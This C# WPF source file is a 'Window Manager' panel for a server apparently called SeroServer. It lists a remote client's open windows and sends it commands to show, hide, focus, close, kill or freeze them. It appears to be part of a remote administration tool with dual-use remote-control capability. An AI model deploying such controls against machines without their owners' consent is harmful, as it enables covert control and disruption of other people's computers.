using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Windows;
using System.Windows.Data;
using System.Windows.Threading;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class WindowEntryVM
{
    public System.Windows.Media.ImageSource? Icon { get; set; }
    public long   Handle      { get; set; }
    public string Title       { get; set; } = "";
    public string ClassName   { get; set; } = "";
    public string ProcessName { get; set; } = "";
    public int    Pid         { get; set; }
    public bool   Visible     { get; set; }
    public string HandleHex   => $"0x{Handle:X8}";
    public string VisibleStr  => Visible ? "Yes" : "No";
    public System.Windows.Media.Brush VisibleColor => Visible
        ? System.Windows.Media.Brushes.MediumSeaGreen
        : new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x45, 0x48, 0x60));
}

public partial class WindowManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<WindowEntryVM> _windows = [];
    private          ICollectionView?  _view;
    private          DispatcherTimer?  _autoRefresh;
    private          string            _searchText = "";

    public WindowManagerWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        RubberBandSelector.Enable(GridWins);
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;

        _view = CollectionViewSource.GetDefaultView(_windows);
        _view.Filter = FilterWindow;
        GridWins.ItemsSource = _view;

        _server.RegisterHandler(clientId, PacketType.WinListResult, OnList);
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _autoRefresh?.Stop();
            _server.UnregisterHandler(clientId, PacketType.WinListResult);
            Lang.LanguageChanged -= ApplyLanguage;
        };

        GridWins.MouseDoubleClick += (_, _) => SendAction("focus");
        Refresh();
    }

    private void ApplyLanguage()
    {
        Title = Lang.Get("FEAT_WINDOW_MGR");
        if (TxtBtnWinShow     != null) TxtBtnWinShow.Text     = Lang.Get("ACT_SHOW");
        if (TxtBtnWinHide     != null) TxtBtnWinHide.Text     = Lang.Get("ACT_HIDE");
        if (TxtBtnWinFocus    != null) TxtBtnWinFocus.Text    = Lang.Get("ACT_FOCUS");
        if (TxtBtnWinMin      != null) TxtBtnWinMin.Text      = Lang.Get("ACT_MINIMIZE");
        if (TxtBtnWinMax      != null) TxtBtnWinMax.Text      = Lang.Get("ACT_MAXIMIZE");
        if (TxtBtnWinRestore  != null) TxtBtnWinRestore.Text  = Lang.Get("ACT_RESTORE");
        if (TxtBtnWinClose    != null) TxtBtnWinClose.Text    = Lang.Get("ACT_CLOSE");
        if (TxtBtnWinKill     != null) TxtBtnWinKill.Text     = Lang.Get("ACT_KILL_SHORT");
        if (TxtBtnWinFreeze   != null) TxtBtnWinFreeze.Text   = Lang.Get("ACT_FREEZE");
        if (TxtBtnWinUnfreeze != null) TxtBtnWinUnfreeze.Text = Lang.Get("ACT_UNFREEZE");
        if (MnuWinShow     != null) MnuWinShow.Header     = Lang.Get("ACT_SHOW");
        if (MnuWinHide     != null) MnuWinHide.Header     = Lang.Get("ACT_HIDE");
        if (MnuWinFocus    != null) MnuWinFocus.Header    = Lang.Get("ACT_FOCUS");
        if (MnuWinRestore  != null) MnuWinRestore.Header  = Lang.Get("ACT_RESTORE");
        if (MnuWinMinimize != null) MnuWinMinimize.Header = Lang.Get("ACT_MINIMIZE");
        if (MnuWinMaximize != null) MnuWinMaximize.Header = Lang.Get("ACT_MAXIMIZE");
        if (MnuWinClose    != null) MnuWinClose.Header    = Lang.Get("ACT_CLOSE");
        if (MnuWinKill     != null) MnuWinKill.Header     = Lang.Get("ACT_KILL_SHORT");
        if (MnuWinFreeze   != null) MnuWinFreeze.Header   = Lang.Get("ACT_FREEZE");
        if (MnuWinUnfreeze != null) MnuWinUnfreeze.Header = Lang.Get("ACT_UNFREEZE");
        if (MnuWinCopyTitle   != null) MnuWinCopyTitle.Header   = Lang.Get("ACT_COPY_TITLE");
        if (MnuWinCopyHandle  != null) MnuWinCopyHandle.Header  = Lang.Get("ACT_COPY_HANDLE");
        if (MnuWinCopyProcess != null) MnuWinCopyProcess.Header = Lang.Get("ACT_COPY_PROCESS");
        if (MnuWinRefresh     != null) MnuWinRefresh.Header     = Lang.Get("ACT_REFRESH");
    }

    private bool FilterWindow(object obj)
    {
        if (string.IsNullOrWhiteSpace(_searchText)) return true;
        var vm = (WindowEntryVM)obj;
        return vm.Title.Contains(_searchText, StringComparison.OrdinalIgnoreCase)
            || vm.ClassName.Contains(_searchText, StringComparison.OrdinalIgnoreCase)
            || vm.ProcessName.Contains(_searchText, StringComparison.OrdinalIgnoreCase);
    }

    private void TxtSearch_TextChanged(object s, System.Windows.Controls.TextChangedEventArgs e)
    {
        _searchText = TxtSearch.Text;
        _view?.Refresh();
        TxtCount.Text = $"({_windows.Count(x => FilterWindow(x))})";
    }

    private void Refresh() => _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.WinGetList });

    private void OnList(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<WinListResultData>(pkt.Data);
        if (d == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            _windows.Clear();
            foreach (var w in d.Windows)
                _windows.Add(new WindowEntryVM
                {
                    Handle      = w.Handle,
                    Title       = w.Title,
                    ClassName   = w.ClassName,
                    ProcessName = w.ProcessName,
                    Pid         = w.Pid,
                    Visible     = w.Visible,
                    Icon        = DecodeIcon(w.IconB64),
                });
            _view?.Refresh();
            int visible = _windows.Count(x => FilterWindow(x));
            TxtCount.Text  = $"({visible}/{d.Windows.Count})";
            TxtStatus.Text = $"Updated {DateTime.Now:HH:mm:ss} — {d.Windows.Count} windows";
        });
    }

    private void SendAction(string action)
    {
        var sel = GridWins.SelectedItems.Cast<WindowEntryVM>().ToList();
        if (sel.Count == 0) return;
        if (action is "close" or "kill")
        {
            string label  = action == "close" ? Lang.Get("ACT_CLOSE") : Lang.Get("ACT_KILL_SHORT");
            string detail = action == "kill" ? $"\n{Lang.Get("WIN_KILL_DETAIL")}" : "";
            string msg    = sel.Count == 1
                ? string.Format(Lang.Get("WIN_CONFIRM_1"), label, sel[0].Title) + detail
                : string.Format(Lang.Get("WIN_CONFIRM_N"), label, sel.Count)    + detail;
            if (MessageBox.Show(msg, Lang.Get("MSG_CONFIRM"), MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes)
                return;
        }
        foreach (var vm in sel)
            _ = _server.SendToClient(_clientId, new Packet
            {
                Type = PacketType.WinAction,
                Data = JsonConvert.SerializeObject(new WinActionData { Handle = vm.Handle, Action = action })
            });
        TxtStatus.Text = sel.Count == 1 ? $"{action} → {sel[0].Title}" : $"{action} → {sel.Count} windows";
        ServerWindow.ReportGlobalActivity($"Window {action}", sel.Count == 1 ? sel[0].Title : $"{sel.Count} windows", "complete");
        ServerWindow.LogGlobal($"[WIN] '{action}' on {(sel.Count == 1 ? $"'{sel[0].Title}'" : $"{sel.Count} windows")} — client {_clientId}.");
    }

    private void ChkAutoRefresh_Changed(object s, RoutedEventArgs e)
    {
        if (ChkAutoRefresh.IsChecked == true)
        {
            if (_autoRefresh == null)
            {
                _autoRefresh = new DispatcherTimer { Interval = TimeSpan.FromSeconds(3) };
                _autoRefresh.Tick += (_, _) => Refresh();
            }
            _autoRefresh.Start();
            TxtStatus.Text = Lang.Get("WIN_AUTOREFRESH_ON");
        }
        else
        {
            _autoRefresh?.Stop();
            TxtStatus.Text = Lang.Get("WIN_AUTOREFRESH_OFF");
        }
    }

    private void BtnRefresh_Click  (object s, RoutedEventArgs e) => Refresh();
    private void BtnShow_Click     (object s, RoutedEventArgs e) => SendAction("show");
    private void BtnHide_Click     (object s, RoutedEventArgs e) => SendAction("hide");
    private void BtnFocus_Click    (object s, RoutedEventArgs e) => SendAction("focus");
    private void BtnRestore_Click  (object s, RoutedEventArgs e) => SendAction("restore");
    private void BtnMinimize_Click (object s, RoutedEventArgs e) => SendAction("minimize");
    private void BtnMaximize_Click2(object s, RoutedEventArgs e) => SendAction("maximize");
    private void BtnClose_Click2   (object s, RoutedEventArgs e) => SendAction("close");
    private void BtnKill_Click     (object s, RoutedEventArgs e) => SendAction("kill");
    private void BtnFreeze_Click   (object s, RoutedEventArgs e) => SendAction("freeze");
    private void BtnUnfreeze_Click (object s, RoutedEventArgs e) => SendAction("unfreeze");

    private void GridWins_CopyTitle_Click(object s, RoutedEventArgs e)
    {
        if (GridWins.SelectedItem is WindowEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Title); TxtStatus.Text = $"Copied: {vm.Title}"; } catch { }
    }

    private void GridWins_CopyHandle_Click(object s, RoutedEventArgs e)
    {
        if (GridWins.SelectedItem is WindowEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.HandleHex); TxtStatus.Text = $"Copied: {vm.HandleHex}"; } catch { }
    }

    private void GridWins_CopyProcess_Click(object s, RoutedEventArgs e)
    {
        if (GridWins.SelectedItem is WindowEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.ProcessName); TxtStatus.Text = $"Copied: {vm.ProcessName}"; } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void GridWins_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridWins.SelectedItems.Count == 0) e.Handled = true;
    }

    private static readonly System.Windows.Media.ImageSource _fallbackIcon = MakeFallbackIcon();
    private static System.Windows.Media.ImageSource MakeFallbackIcon()
    {
        var dg    = new System.Windows.Media.DrawingGroup();
        var frame = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x35, 0x48, 0x80));
        var title = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x4A, 0x85, 0xF5));
        var body  = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Color.FromRgb(0x18, 0x20, 0x40));
        using (var ctx = dg.Open())
        {
            ctx.DrawRoundedRectangle(frame, null, new System.Windows.Rect(0, 0, 16, 13), 1.5, 1.5);
            ctx.DrawRectangle(title, null, new System.Windows.Rect(1, 1, 14, 3.5));
            ctx.DrawRectangle(body,  null, new System.Windows.Rect(1, 4.5, 14, 7.5));
        }
        var img = new System.Windows.Media.DrawingImage(dg);
        img.Freeze();
        return img;
    }

    private static System.Windows.Media.ImageSource? DecodeIcon(string b64)
    {
        if (string.IsNullOrEmpty(b64)) return _fallbackIcon;
        try
        {
            var bytes = Convert.FromBase64String(b64);
            using var ms = new System.IO.MemoryStream(bytes);
            var bmp = new System.Windows.Media.Imaging.BitmapImage();
            bmp.BeginInit(); bmp.CacheOption = System.Windows.Media.Imaging.BitmapCacheOption.OnLoad;
            bmp.StreamSource = ms; bmp.EndInit(); bmp.Freeze();
            return bmp;
        }
        catch { return _fallbackIcon; }
    }
}
